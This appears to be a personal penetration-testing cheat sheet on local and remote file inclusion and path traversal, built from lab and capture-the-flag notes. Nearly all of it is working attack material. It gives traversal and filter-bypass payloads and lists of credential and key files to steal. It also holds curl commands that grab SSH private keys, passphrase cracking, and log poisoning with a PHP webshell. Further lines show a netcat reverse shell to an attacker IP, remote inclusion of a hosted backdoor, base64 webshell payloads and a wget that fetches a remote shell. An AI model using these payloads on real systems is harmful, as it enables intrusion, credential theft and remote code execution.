## LFI to look for:
```
Simple Check:
etc/passwd
etc/passwd%00
etc%2fpasswd
etc%2fpasswd%00
etc%5cpasswd
etc%5cpasswd%00
etc%c0%afpasswd
etc%c0%afpasswd%00
C:\boot.ini
C:\WINDOWS\win.ini
```

## Private Keys:
```
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ecdsa_sk
~/.ssh/id_ed25519
~/.ssh/id_ed25519_sk
~/.ssh/authorized_keys
```

## Public Keys & Authorized Keys File
```
~/.ssh/id_rsa.pub
~/.ssh/id_dsa.pub
~/.ssh/id_ecdsa.pub
~/.ssh/id_ecdsa_sk.pub
~/.ssh/id_ed25519.pub
~/.ssh/id_ed25519_sk.pub
~/.ssh/identity
~/.ssh/identity.pub

Authorized Keys File
Create .ssh dir and authorized keys for easy access
        > mkdir ~/.ssh/; touch ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
        - Add your id_rsa.pub key to authorized keys
        - should be able to ssh to the system with no password
```

## Crack Public Key
```
Crack Public Key
There’s a great tool, RsaCtfTool, that will try a bunch of different well known cryptography attacks against a public key. I’ll clone it on to my machine, and run it, giving it the public key and --private so that it will show the private key if it cracks it. After a few minutes, it does:

muted@winter$ /opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private 

[*] Testing key rootauthorizedsshkey.pub.
[*] Performing factordb attack on rootauthorizedsshkey.pub.
[*] Performing fibonacci_gcd attack on rootauthorizedsshkey.pub.
100%| 9999/9999 [00:00<00:00, 157548.15it/s]
[*] Performing system_primes_gcd attack on rootauthorizedsshkey.pub.
100 7007/7007 [00:00<00:00, 1363275.26it/s]
[*] Performing pastctfprimes attack on rootauthorizedsshkey.pub.
100 113/113 [00:00<00:00, 1419030.99it/s]
[*] Performing nonRSA attack on rootauthorizedsshkey.pub.
...[snip]...
[*] Attack success with wiener method !

Results for rootauthorizedsshkey.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
...[snip]...
hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
-----END RSA PRIVATE KEY-----

I’ll save that to a file and chmod it to 600 so SSH will use it.
```

## Example LFI to keygrab 1
```
kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
kali@kali:~$ chmod 400 dt_key
kali@kali:~$ ssh -i dt_key -p 2222 user@valleys.com
```

## Example Exploit Flow
```
Let's say maybe you find a wordpress site and scan for plugins with WPScan.
You find some vulnerable plugins and research them for exploits with searchsploit.
You find one that is applicable and it turns out to be a Directory Traversal vulnerability.
You Utilize the exploit to read /etc/passwd and identify two users, add them to your users.txt.
From here there are several files we can attempt to retrieve via Directory Traversal in order to obtain access to a system.
One of the most common methods is to retrieve an SSH private key configured with permissions that are too open.
Next attempt to retrieve an SSH private key with the name id_rsa.
The name will differ depending on the specified type when creating an SSH private key with ssh-keygen. When choosing ecdsa as the type, the resulting SSH private key is named id_ecdsa by default.
/home/wint3rmute/.ssh/id_rsa  <-- Username enumeration is creticial before successful key LFI. Read /etc/passwd first. Then try your key types. 
/home/PeterRiviera/.ssh/id_rsa <-- Success finding an id_rsa key for user PeterRiviera.
Attempt to leverage this key to access WEBSRV1 as PeterRiviera via SSH. 
Change the Permissions: chmod 600 id_rsa
Try logging in: ssh -i id_rsa PeterRiviera@192.168.50.244
Enter passphrase for key 'id_rsa': 
The SSH private key is protected by a passphrase. 
Convert the key with ssh2john id_rsa > ssh.hash
Crack the passphrase of the SSH private key:  $ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
VillaStraylight    (id_rsa)
Login with the cracked passphrase and gain access to the server. 
```

## Fuzzing
```
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

LFI file lists
Linux LFI file directories
https://github.com/hussein98d/LFI-files

wfuzz
Then use the list to find out which ones work:
$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt

Find out how many characters a wrong request is, then filter those out:
$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000

ffuf
The following sequence of commands allows the generation of payloads using sed (1) as input for url fuzzing tools such as ffuf (2):
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"

```

### Directory Traversal
```
    - look in url for “file=<file>” in the url
    - Change “file” to a new file like c:\windows\system32\drivers\etc\hosts
    
Null byte, bypass to view files
    > vuln.php?page=/etc/passwd%00
    > vuln.php?page=/etc/passwd%2500

Windows hosts file
Let's change the parameter value to c:\windows\system32\drivers\etc\hosts and submit the URL:
http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
    
Basic Path Traversal    
http://valleys.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa -- Curl is better for grabbing private keys, formatting. 

kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

## Encoding special characters
```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ = ../../../../../../../../../../
%2e%2e/ = ../../
```

## cgi-bin exploit
```
curl --silent --path-as-is --insecure -k "target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
In Burpsuite
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/home/mollie/.ssh/id_ecdsa HTTP/1.1
```

## Encoding
```
%2e%2e%2f = ../  <-- URL Encoded
%252e%252e%252f = ../  <-- Double URL encoded
%c0%ae%c0%ae%c0%af = ../  <-- UTF-8 Unicode Encoding
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216

16 bits Unicode encoding
. = %u002e
/ = %u2215
\ = %u2216

UTF-8 Unicode encoding
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

## ../ Concatenation
```
Bypass "../" replaced by "" concatenation
Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
..././
...\.\
```

## Bypass "../" with ";"
```
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
```

## Double URL encoding
```
. = %252e
/ = %252f
\ = %255c

e.g: Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

## NGINX/ALB Bypass
```
NGINX in certain configurations and ALB can block traversal attacks in the route, For example: http://nginx-server/../../ will return a 400 bad request.
To bypass this behaviour just add forward slashes in front of the url: http://nginx-server////////../../
```

## Java Bypass
```
Bypass Java's URL protocol
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

## Interesting Linux files
```
Linux:
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
```

## Interesting Windows files
```
Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside...
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt

Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)

c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam  <--Worth checking right?  impacket-secretsdump -system SYSTEM -sam SAM LOCAL
c:/windows/repair/system

This is not an exhaustive list, installation directories will vary, I’ve only listed common ones.
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini 
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml


```

## Log Poisoning
```
The following log files are controllable and can be included with an evil payload to achieve a command execution:

/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

## Log Poisoning Example
```
The idea behind log poisoning is to put some php into the logs, and then load them where php will be executed. If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting.

The simplest case would be to change our user-agent string such that it includes php, and then include that log file with our LFI. We could also poison the url field, but visiting something like http://10.10.10.84/browse.php?not_an_arg=[php code]. As long as we can get our php written into the log, we will succeed.

Finding the Logs
Next, we’ll want to find the httpd.conf file, which will tell us where the log files are located.
We’ll find that at /usr/local/etc/apache24/httpd.conf, and if we get that file (using the url http://10.10.10.84/browse.php?file=/usr/local/etc/apache24/httpd.conf), we’ll see the locations of the access and error logs:

ErrorLog "/var/log/httpd-error.log"
CustomLog "/var/log/httpd-access.log" combined

Log Poisoning
Lines in our access log look like this:
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET /HNAP1 HTTP/1.1" 404 203 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

We’ll modify our user-agent using burp to add a webshell. I always like to add a marker here (like “0xdf:”), so that as the log file grows, we can easily locate our output, either with ctrl-f, or using curl and grep.

GET / HTTP/1.1
Host: 10.10.10.84
User-Agent: Mozilla/5.0 <?php echo system($_GET ['cmd']; ?> <--  Example Header injection
User-Agent: 0xdf: <?php system($_GET['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

Then visit: http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=id

Reverse Shell
Just like we didn’t need the webshell, we don’t really need a reverse shell to complete Poison. Even if we hadn’t found pwdbackup.txt with listfiles.php, we still could find it now running ls in our webshell. Still, the fun of HTB is getting shells, so let’s get one with this web shell.
Check Connectivity

A ping shows that we can generate outbound network traffic back to our host:

view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=ping 10.10.14.6

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:03:55.775947 IP 10.10.10.84 > kali: ICMP echo request, id 30469, seq 0, length 64
13:03:55.775985 IP kali > 10.10.10.84: ICMP echo reply, id 30469, seq 0, length 64
13:03:56.799382 IP 10.10.10.84 > kali: ICMP echo request, id 30469, seq 1, length 64
13:03:56.799404 IP kali > 10.10.10.84: ICMP echo reply, id 30469, seq 1, length 64

A quick test with nc shows that we can get tcp connections back as well:

view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=nc 10.10.14.6 8081

Shell as www

So let’s use the robust pipe shell from Pentest Monkey’s Cheatsheet and get a shell. Visit view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.6%209001%20%3E/tmp/f, and:

root@kali# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.84] 19226
sh: can't access tty; job control turned off
$ pwd
/usr/local/www/apache24/data
$ id
uid=80(www) gid=80(www) groups=80(www)
```

## Log Poisoning LFI
```
Intercept the GET request and edit the User-Agent with a php webshell:
User-Agent: Mozilla/5.0 <?php echo system($_GET ['cmd']; ?>

Access the webshell via lfi:
Intercept the GET request with the vulnerable parameter injection point and access your webshell in the log:
http://site/comets/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ls%20-ls HTTP/1.1


```

## Traversal sequences stripped non-recursively
```
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

## Null byte (%00)
```
Bypass the append more chars at the end of the provided string (bypass of: $_GET['param']."php")
http://example.com/index.php?page=../../../etc/passwd%00
This is solved since PHP 5.4
```

## Encoding
```
You could use non-standard encondings like double URL encode (and others):
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

## From existent folder
```
Maybe the back-end is checking the folder path:
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

## Identifying folders on a server
```
Depending on the applicative code / allowed characters, it might be possible to recursively explore the file system by discovering folders and not just files. In order to do so:
identify the "depth" of you current directory by succesfully retrieving /etc/passwd (if on Linux):
http://example.com/index.php?page=../../../etc/passwd # depth of 3

try and guess the name of a folder in the current directory by adding the folder name (here, private), and then going back to /etc/passwd:
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd 

if the application is vulnerable, there might be two different outcomes to the request:
if you get an error / no output, the private folder does not exist at this location
if you get the content from /etc/passwd, you validated that there is indeed a privatefolder in your current directory
the folder(s) you discovered using this techniques can then be fuzzed for files (using a classic LFI method) or for subdirectories using the same technique recursively.

It is possible to adapt this technique to find directories at any location in the file system. For instance, if, under the same hypothesis (current directory at depth 3 of the file system) you want to check if /var/www/ contains a private directory, use the following payload:

http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```

## Path truncation
```
Bypass the append of more chars at the end of the provided string (bypass of: $_GET['param']."php")
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.

http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd

Always try to start the path with a fake directory (a/).
This vulnerability was corrected in PHP 5.3.
```

##  Filter Bypass Tricks
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
```

## Basic RFI
```
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php

Remote File Inclusion (RFI)
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php

<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. 
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80

curl "http://valleys.com/comet/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/php-reverse-shell.php&%20php%20php-reverse-shell.php"
$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"

kali@kali:/usr/share/webshells/php/$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
We successfully exploited an RFI vulnerability by including a remotely hosted webshell. 
We could now use Netcat again to create a reverse shell and receive an interactive shell on the target system.

$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/php-reverse-shell.php&%20php%20php-reverse-shell.php"
$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/simple-backdoor.php&cmd=cat%20/home/mollie/.ssh/authorized_keys"
```

## Top 25 Parameters
```
Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI) vulnerabilities
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

## LFI / RFI using PHP wrappers & protocols
```
php://filter
PHP filters allow perform basic modification operations on the data before being it's read or written. There are 5 categories of filters:

data://
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"

PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4 <----- payload 

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+

expect://
Expect has to be activated. You can execute code using this.
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls

input://
Specify your payload in the POST parameters
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```

## LFI via PHP's 'assert'
```
If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.

A payload like this:
' and die(show_source('/etc/passwd')) or '
will successfully exploit PHP code for a "file" parameter that looks like this:
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

It's also possible to get RCE in a vulnerable "assert" statement using the system() function:
' and die(system("whoami")) or '
Be sure to URL-encode payloads before you send them.
```

## /proc/self/environ
```
Having access to this file during LFI can lead to rce /proc/self/environ allowing us to use local variables. wget echo etc
/vtigercrm/graph.php?current_language=../../../../../../../..//proc/self/environ%00&module=Accounts&action HTTP/1.1
<?php('wget http://hack-bay.com/Shells/gny.txt -O shell.php');?>    <--- Put this in the user agent. 
```





